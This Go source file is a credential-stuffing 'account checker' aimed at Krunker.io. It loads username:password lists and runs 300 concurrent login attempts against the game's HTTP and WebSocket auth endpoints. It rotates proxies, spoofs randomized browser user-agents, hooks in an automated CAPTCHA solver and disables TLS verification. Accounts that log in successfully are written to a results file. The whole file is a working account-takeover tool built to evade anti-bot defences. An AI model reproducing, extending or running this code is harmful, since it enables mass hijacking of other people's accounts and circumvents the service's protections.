package services

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/vmihailenco/msgpack"
)

const (
	loginURL = "https://gapi.svc.krunker.io/auth/login/username"
	origin   = "https://krunker.io/"
)

var (
	c1 = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0", "115.0.0.0"}
	c2 = []string{"119.0", "118.0", "117.0", "116.0", "115.0"}
	c3 = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0"}

	windowsVersions = []string{"Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64"}

	rng = rand.New(rand.NewSource(time.Now().UnixNano()))
)

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Error string `json:"error,omitempty"`
	Data  *struct {
		Type        string `json:"type"`
		ChallengeID string `json:"challenge_id"`
	} `json:"data,omitempty"`
}

type Account struct {
	Username string
	Password string
	Status   string
}

type ProxyManager struct {
	proxies []string
	current int
}

var proxyManager *ProxyManager

var fileMutex sync.Mutex

type ThreadSafeCounters struct {
	validCount   int
	migrateCount int
	totalCount   int
	mu           sync.Mutex
}

func (c *ThreadSafeCounters) IncrementValid() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.validCount++
}

func (c *ThreadSafeCounters) IncrementMigrate() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.migrateCount++
}

func (c *ThreadSafeCounters) IncrementTotal() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.totalCount++
}

func (c *ThreadSafeCounters) GetCounts() (int, int, int) {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.validCount, c.migrateCount, c.totalCount
}

func sexyagent() string {
	browsers := []string{"chrome", "firefox", "edge"}
	browser := browsers[rng.Intn(len(browsers))]

	switch browser {
	case "chrome":
		return m1()
	case "firefox":
		return m2()
	case "edge":
		return m3()
	default:
		return m1()
	}
}

func m1() string {
	version := c1[rng.Intn(len(c1))]
	osString := windowsVersions[rng.Intn(len(windowsVersions))]

	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", osString, version)
}

func m2() string {
	version := c2[rng.Intn(len(c2))]
	osString := "Windows NT 10.0; Win64; x64"

	return fmt.Sprintf("Mozilla/5.0 (%s; rv:109.0) Gecko/20100101 Firefox/%s", osString, version)
}

func m3() string {
	version := c3[rng.Intn(len(c3))]
	osString := windowsVersions[rng.Intn(len(windowsVersions))]

	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", osString, version, version)
}

func ProcessAccounts() error {
	if err := initProxyManager(); err != nil {
		return fmt.Errorf("failed to initialize proxy manager: %w", err)
	}

	if err := os.MkdirAll("results", 0755); err != nil {
		return fmt.Errorf("failed to create results directory: %w", err)
	}

	accounts, err := readAccountsFile("data/accounts.txt")
	if err != nil {
		return fmt.Errorf("failed to read accounts file: %w", err)
	}

	if len(accounts) == 0 {
		return fmt.Errorf("no accounts found in data/accounts.txt")
	}

	counters := &ThreadSafeCounters{}

	const numWorkers = 300
	accountChan := make(chan Account, len(accounts))
	var wg sync.WaitGroup

	for _, account := range accounts {
		accountChan <- account
	}
	close(accountChan)

	progressChan := make(chan struct{}, len(accounts))

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			processAccountWorker(workerID, accountChan, counters, progressChan)
		}(i)
	}

	go func() {
		for range progressChan {
		}
	}()

	wg.Wait()

	close(progressChan)

	time.Sleep(100 * time.Millisecond)

	validCount, migrateCount, totalProcessed := counters.GetCounts()
	invalidCount := totalProcessed - validCount - migrateCount

	fmt.Printf("gud accounts (login_ok): %d\n", validCount)
	fmt.Printf("needs migration: %d\n", migrateCount)
	fmt.Printf("bad accounts: %d\n", invalidCount)

	return nil
}

func processAccountWorker(workerID int, accountChan <-chan Account, counters *ThreadSafeCounters, progressChan chan<- struct{}) {
	for account := range accountChan {
		time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond)

		status, err := checkAccountWithCaptcha(account)
		if err != nil {
			fmt.Printf("[Worker %d] %s:%s (error: %v)\n", workerID, account.Username, account.Password, err)
			counters.IncrementTotal()
			progressChan <- struct{}{}
			continue
		}

		account.Status = status

		fmt.Printf("[Worker %d] %s:%s (%s)\n", workerID, account.Username, account.Password, status)

		switch status {
		case "login_ok":
			if err := appendAccountToFileThreadSafe("results/login_ok.txt", account); err != nil {
				fmt.Printf("[Worker %d] Failed to save login_ok account: %v\n", workerID, err)
			}
			counters.IncrementValid()

		case "needs_migrate":
			if err := appendAccountToFileThreadSafe("results/needs_migrate.txt", account); err != nil {
				fmt.Printf("[Worker %d] Failed to save needs_migrate account: %v\n", workerID, err)
			}
			counters.IncrementMigrate()
		}

		counters.IncrementTotal()
		progressChan <- struct{}{}

		time.Sleep(100 * time.Millisecond)
	}
}

func appendAccountToFileThreadSafe(filename string, account Account) error {
	fileMutex.Lock()
	defer fileMutex.Unlock()

	return appendAccountToFile(filename, account)
}

func appendAccountToFile(filename string, account Account) error {
	dir := filepath.Dir(filename)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open file for appending: %w", err)
	}
	defer file.Close()
	line := fmt.Sprintf("%s:%s\n", account.Username, account.Password)
	if _, err := file.WriteString(line); err != nil {
		return fmt.Errorf("failed to write account: %w", err)
	}
	if err := file.Sync(); err != nil {
		return fmt.Errorf("failed to sync file: %w", err)
	}

	return nil
}

func checkAccountWithCaptcha(account Account) (string, error) {
	httpStatus, httpErr := checkAccountHTTP(account)
	if httpErr == nil && httpStatus != "unknown" {
		return httpStatus, nil
	}

	return checkAccountWebSocket(account)
}

func checkAccountHTTP(account Account) (string, error) {
	loginReq := LoginRequest{
		Username: account.Username,
		Password: account.Password,
	}

	jsonData, err := json.Marshal(loginReq)
	if err != nil {
		return "", fmt.Errorf("failed to marshal login request: %w", err)
	}

	req, err := http.NewRequest("POST", loginURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", sexyagent())
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", "https://krunker.io/")

	var proxyURL string
	if proxyManager != nil && len(proxyManager.proxies) > 0 {
		proxyURL = proxyManager.getNextProxy()
	}

	client := createHTTPClient(proxyURL)

	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		resp, err := client.Do(req)
		if err != nil {
			if proxyManager != nil && len(proxyManager.proxies) > 0 && attempt < maxRetries-1 {
				proxyURL = proxyManager.getNextProxy()
				client = createHTTPClient(proxyURL)
				continue
			}
			return "", fmt.Errorf("request failed after retries")
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "", fmt.Errorf("failed to read response: %w", err)
		}

		var loginResp LoginResponse
		if err := json.Unmarshal(body, &loginResp); err != nil {
			return "", fmt.Errorf("failed to unmarshal response: %w", err)
		}

		if loginResp.Error != "" {
			switch loginResp.Error {
			case "password incorrect":
				return "password_incorrect", nil
			case "username incorrect":
				return "username_incorrect", nil
			case "invalid account or password":
				return "invalid", nil
			default:
				return "unknown_error", nil
			}
		}

		if loginResp.Data != nil {
			switch loginResp.Data.Type {
			case "ensure_migrated":
				return "needs_migrate", nil
			case "check_2fa":
				return "2fa_required", nil
			case "login_ok":
				return "login_ok", nil
			}
		}

		if resp.StatusCode == 200 {
			return "login_ok", nil
		}

		break
	}

	return "unknown", nil
}

func checkAccountWebSocket(account Account) (string, error) {
	u := url.URL{Scheme: "wss", Host: "social.krunker.io", Path: "/ws"}
	dialer := websocket.DefaultDialer
	if proxyManager != nil && len(proxyManager.proxies) > 0 {
		proxyURL := proxyManager.getNextProxy()
		if proxyURL != "" {
			if proxy, err := url.Parse(proxyURL); err == nil {
				dialer.Proxy = http.ProxyURL(proxy)
			}
		}
	}
	header := http.Header{}
	header.Add("Origin", origin)
	header.Add("User-Agent", sexyagent())
	header.Add("Pragma", "no-cache")
	header.Add("Cache-Control", "no-cache")

	maxRetries := 3
	var conn *websocket.Conn
	var err error

	for attempt := 0; attempt < maxRetries; attempt++ {
		conn, _, err = dialer.Dial(u.String(), header)
		if err != nil {
			if proxyManager != nil && len(proxyManager.proxies) > 0 && attempt < maxRetries-1 {
				proxyURL := proxyManager.getNextProxy()
				if proxyURL != "" {
					if proxy, parseErr := url.Parse(proxyURL); parseErr == nil {
						dialer.Proxy = http.ProxyURL(proxy)
					}
				}
				continue
			}
			return "", fmt.Errorf("failed to connect to WebSocket after retries")
		}
		break
	}

	if conn == nil {
		return "", fmt.Errorf("failed to establish WebSocket connection")
	}
	defer conn.Close()

	time.Sleep(1 * time.Second)

	loginMessage := []interface{}{"auth", "login", map[string]string{
		"username": account.Username,
		"password": account.Password,
	}}

	packedMessage, err := msgpack.Marshal(loginMessage)
	if err != nil {
		return "", fmt.Errorf("failed to encode login message: %w", err)
	}

	err = conn.WriteMessage(websocket.BinaryMessage, append(packedMessage, 0x00, 0x00))
	if err != nil {
		return "", fmt.Errorf("failed to write login message: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	maxAttempts := 20
	captchaSolved := false

	for i := 0; i < maxAttempts; i++ {
		messageType, msg, err := conn.ReadMessage()
		if err != nil {
			return "", fmt.Errorf("failed to read message: %w", err)
		}

		if messageType != websocket.BinaryMessage || len(msg) < 2 {
			continue
		}

		var decodedMessage []interface{}
		err = msgpack.Unmarshal(msg[:len(msg)-2], &decodedMessage)
		if err != nil {
			continue
		}
		if len(decodedMessage) >= 1 && decodedMessage[0] == "cpt" {
			fmt.Printf("  → Solving captcha for %s...\n", account.Username)
		}

		if len(decodedMessage) >= 1 {
			switch decodedMessage[0] {
			case "cpt":
				if err := SolveCaptcha(conn, decodedMessage); err != nil {
					return "captcha_failed", fmt.Errorf("failed to solve captcha: %w", err)
				}
				captchaSolved = true
				time.Sleep(1 * time.Second)
				err = conn.WriteMessage(websocket.BinaryMessage, append(packedMessage, 0x00, 0x00))
				if err != nil {
					return "", fmt.Errorf("failed to resend login request: %w", err)
				}
				continue

			case "auth":
				if len(decodedMessage) >= 3 {
					status := toString(map[string]interface{}{
						"status": decodedMessage[2],
					}, "status")

					switch status {
					case "ok", "success":
						return "login_ok", nil
					case "migrate", "ensure_migrated":
						return "needs_migrate", nil
					case "2fa", "check_2fa":
						return "2fa_required", nil
					case "invalid":
						return "invalid", nil
					case "password_incorrect":
						return "password_incorrect", nil
					case "username_incorrect":
						return "username_incorrect", nil
					}
				}

			case "error":
				if len(decodedMessage) >= 2 {
					errorMsg := toString(map[string]interface{}{
						"error": decodedMessage[1],
					}, "error")

					switch {
					case strings.Contains(errorMsg, "password"):
						return "password_incorrect", nil
					case strings.Contains(errorMsg, "username"):
						return "username_incorrect", nil
					case strings.Contains(errorMsg, "invalid"):
						return "invalid", nil
					default:
						return "unknown_error", nil
					}
				}

			case "success":
				return "login_ok", nil
			}
		}

		if captchaSolved {
			continue
		}
	}

	return "unknown", fmt.Errorf("no clear response received after %d attempts", maxAttempts)
}

func readAccountsFile(filename string) ([]Account, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file %s: %w", filename, err)
	}
	defer file.Close()

	var accounts []Account
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ":")
		if len(parts) != 2 {
			continue
		}

		accounts = append(accounts, Account{
			Username: strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(parts[1]),
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file: %w", err)
	}

	return accounts, nil
}

func initProxyManager() error {
	proxies, err := readProxiesFile("data/proxies.txt")
	if err != nil {
		return fmt.Errorf("failed to read proxies.txt: %w", err)
	}

	if len(proxies) == 0 {
		return fmt.Errorf("no valid proxies found in proxies.txt")
	}

	fmt.Printf("Loaded %d proxies\n", len(proxies))
	proxyManager = &ProxyManager{
		proxies: proxies,
		current: 0,
	}

	return nil
}

func (pm *ProxyManager) getNextProxy() string {
	if len(pm.proxies) == 0 {
		return ""
	}
	index := int(time.Now().UnixNano()) % len(pm.proxies)
	return pm.proxies[index]
}

func createHTTPClient(proxyURL string) *http.Client {
	if proxyURL == "" {
		return &http.Client{
			Transport: &http.Transport{
				DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					return nil, fmt.Errorf("proxy required but none available")
				},
			},
		}
	}

	transport := &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:       100,
		IdleConnTimeout:    90 * time.Second,
		DisableCompression: true,
	}

	if proxy, err := url.Parse(proxyURL); err == nil {
		transport.Proxy = http.ProxyURL(proxy)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func readProxiesFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") && !strings.HasPrefix(line, "socks5://") {
			line = "http://" + line
		}

		proxies = append(proxies, line)
	}

	return proxies, scanner.Err()
}
